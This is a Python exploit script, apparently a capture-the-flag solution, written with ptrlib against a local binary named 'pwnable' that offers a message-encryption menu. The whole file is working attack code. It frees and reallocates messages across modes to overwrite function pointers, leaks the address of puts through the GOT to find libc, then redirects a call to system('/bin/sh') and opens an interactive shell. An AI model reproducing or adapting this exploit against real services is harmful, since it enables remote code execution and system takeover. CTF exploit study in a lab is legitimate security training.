from ptrlib import *

def encrypt_message(mode, size, message):
    sock.recvuntil(">")
    sock.sendline("1")
    sock.recvuntil(">")
    sock.sendline(str(mode))
    if 1 <= mode <= 2:
        sock.recvuntil(">")
        sock.sendline(str(size))
        sock.recvuntil("message: ")
        sock.sendline(message)
        sock.recvuntil("message is: ")
        return sock.recvline().rstrip()
    else:
        return None

def remove_encrypted_message(index):
    sock.recvuntil(">")
    sock.sendline("2")
    sock.recvuntil("remove: ")
    sock.sendline(str(index))

def view_encrypted_message(index):
    sock.recvuntil(">")
    sock.sendline("3")
    sock.recvuntil("Message #" + str(index) + "\n")
    sock.recvuntil("Plaintext: ")
    plaintext = sock.recvline().rstrip()
    sock.recvuntil("Ciphertext: ")
    ciphertext = sock.recvline().rstrip()
    return plaintext, ciphertext

def edit_encrypted_message(index, message):
    sock.recvuntil(">")
    sock.sendline("4")
    sock.recvuntil("edit\n")
    sock.sendline(str(index))
    sock.recvuntil("message\n")
    sock.sendline(message)

elf = ELF("./pwnable")
plt_puts = 0x004006e0
libc = ELF("./libc-2.17.so")
sock = Socket("127.0.0.1", 9001)
_ = input()

sock.recvline()
sock.sendline("0")

# libc leak
payload = b''
payload += p64(elf.got("puts"))
payload += p64(elf.got("puts"))
payload += p64(plt_puts)
payload += p64(plt_puts)
payload += p64(0)

encrypt_message(2, 0x200, "A") # 0
remove_encrypted_message(0)
encrypt_message(3, 0, '') # 0
encrypt_message(3, 0, '') # 1

edit_encrypted_message(0, payload)

edit_encrypted_message(1, '')
addr_puts = u64(sock.recvline().rstrip())
libc_base = addr_puts - libc.symbol("puts")
addr_system = libc_base + libc.symbol("system")
addr_binsh = libc_base + next(libc.search("/bin/sh"))
dump("libc_base = " + hex(libc_base))

# get the shell!
payload = b''
payload += p64(addr_binsh)
payload += p64(addr_binsh)
payload += p64(addr_system)
payload += p64(addr_system)
payload += p64(0)
edit_encrypted_message(0, payload)

edit_encrypted_message(1, '')

sock.interactive()

